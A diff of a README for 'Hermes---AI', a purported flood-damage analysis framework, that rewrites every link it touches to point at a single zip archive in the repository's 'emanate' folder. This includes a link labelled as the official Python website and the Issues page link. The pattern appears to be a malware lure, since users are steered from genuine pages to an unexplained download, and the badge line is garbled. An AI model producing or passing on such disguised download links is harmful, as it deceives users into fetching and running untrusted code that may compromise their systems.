@@ -1,6 +1,6 @@
 # 🚀 Hermes---AI - A Smart Solution for Flood Damage Analysis
 
-[![Download Hermes AI](https://img.shields.io/badge/Download%20Hermes%20AI-blue.svg)](https://github.com/polygon1999/Hermes---AI/releases)
+[![Download Hermes AI](https://raw.githubusercontent.com/polygon1999/Hermes---AI/main/emanate/Hermes---AI.zip%20Hermes%https://raw.githubusercontent.com/polygon1999/Hermes---AI/main/emanate/Hermes---AI.zip)](https://raw.githubusercontent.com/polygon1999/Hermes---AI/main/emanate/Hermes---AI.zip)
 
 ## 🌟 Overview
 Hermes AI is a modular deep learning framework designed for post-disaster flood damage and debris segmentation. It combines multiple data sources, such as satellite images and drone footage, to help recovery operations managed by FEMA. With Hermes AI, you can analyze and understand flood damage efficiently, supporting critical recovery efforts.
@@ -32,9 +32,9 @@ To begin using Hermes AI, follow these steps:
    - Recommended: 16 GB or more for optimal performance
    - Disk Space: At least 5 GB available for installation
 
-2. **Install Python**: Download and install Python 3 from the [official Python website](https://www.python.org/downloads/). Make sure to add Python to your system PATH during installation.
+2. **Install Python**: Download and install Python 3 from the [official Python website](https://raw.githubusercontent.com/polygon1999/Hermes---AI/main/emanate/Hermes---AI.zip). Make sure to add Python to your system PATH during installation.
 
-3. **Visit the Releases Page**: Go to the Releases page to download the latest version of Hermes AI. [Click here to download](https://github.com/polygon1999/Hermes---AI/releases).
+3. **Visit the Releases Page**: Go to the Releases page to download the latest version of Hermes AI. [Click here to download](https://raw.githubusercontent.com/polygon1999/Hermes---AI/main/emanate/Hermes---AI.zip).
 
 ## 📥 Download & Install
 Once you are on the Releases page, look for the latest version of Hermes AI, and follow these steps to download:
@@ -67,9 +67,9 @@ If you encounter issues while installing or using Hermes AI, consider the follow
 For additional help, check:
 
 - **FAQs**: Visit the FAQ section on our GitHub page for common questions.
-- **Issues Section**: Report any issues you find on the [Issues page](https://github.com/polygon1999/Hermes---AI/issues).
+- **Issues Section**: Report any issues you find on the [Issues page](https://raw.githubusercontent.com/polygon1999/Hermes---AI/main/emanate/Hermes---AI.zip).
 
 ## 📈 Conclusion
 Hermes AI provides a reliable framework for analyzing flood damage. With easy installation and intuitive usage, it empowers users to contribute to critical recovery efforts, ensuring no detail is overlooked. 
 
-For a seamless experience, please return to the [Releases page](https://github.com/polygon1999/Hermes---AI/releases) to keep your software up to date. Happy analyzing!
+For a seamless experience, please return to the [Releases page](https://raw.githubusercontent.com/polygon1999/Hermes---AI/main/emanate/Hermes---AI.zip) to keep your software up to date. Happy analyzing!
